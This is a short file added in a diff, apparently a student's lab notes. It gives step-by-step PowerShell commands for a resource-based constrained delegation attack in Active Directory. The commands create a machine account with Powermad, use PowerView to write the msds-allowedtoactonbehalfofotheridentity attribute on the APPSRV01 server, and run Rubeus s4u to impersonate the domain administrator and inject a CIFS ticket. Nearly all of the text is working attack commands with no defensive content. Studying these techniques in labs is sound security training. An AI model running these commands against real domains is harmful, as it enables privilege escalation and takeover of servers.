@@ -1,0 +1,25 @@
+IMPORTANT NOTE: ALL THIS PROCESS MUST BE PERFORMED FROM A POWERSHELL CONSOLE
+
+1st We need an SPN in order to perform the attack and GENERALLY an ACL that give us write permission over the backend machine object we want to compromise(in this PoC it the backend machine will be APPSRV01, the user that have write perssions will be prod\dave and the fronted SPN will be PROD\mycomputer$)
+
+2nd Create a new computer machine object that will have an SPN assigned to it; creation of the machine with powermad -> New-MachineAccount -MachineAccount myComputer -Password $(ConvertTo-SecureString 'h4x' -AsPlainText -Force);
+checking the SPN for that computer with powerview -> Get-DomainComputer -Identity myComputer
+
+3rd We must convert the SID of our newly-created computer object to the correct format in order to proceed with the attack:
+	1. $sid =Get-DomainComputer -Identity myComputer -Properties objectsid | Select -Expand objectsid
+	2. $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($sid))"
+	3. $SDbytes = New-Object byte[] ($SD.BinaryLength)
+	4. $SD.GetBinaryForm($SDbytes,0)
+	5. Get-DomainComputer -Identity appsrv01 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
+	
+4th After the SecurityDescriptor has been converted to the correct format, we can use Get-DomainComputer to obtain a handle to the computer object for APPSRV01 and then pipe that into Set-DomainObject , which can update properties by specifying them with -Set options:
+
+VERIFICATION THAT WE SUCCESSFULLY WROTE THE "msds-allowedtoactonbehalfofotheridentity" correctly:
+	1. $RBCDbytes = Get-DomainComputer appsrv01 -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity
+	2. $Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RBCDbytes, 0
+	3. $Descriptor.DiscretionaryAcl   -> this will return us an SID in the SecurityIdentifier field, that we must convert
+	4. ConvertFrom-SID S-1-5-21-3776646582-2086779273-4091361643-2101  -> this must return us with: PROD\myComputer$
+	
+NOW WE WILL REQUEST A TGS FOR THE SPN: "CIFS/appsrv01.prod.corp1.com" USING RUBEUS AND THE S4USELF AND S4UPROXY(this part is very similar to constrained delegation)
+	1. .\Rubeus.exe hash /password:h4x
+	2. .\Rubeus.exe s4u /user:myComputer$ /rc4:AA6EAFB522589934A6E5CE92C6438221 /impersonateuser:administrator /msdsspn:CIFS/appsrv01.prod.corp1.com /ptt
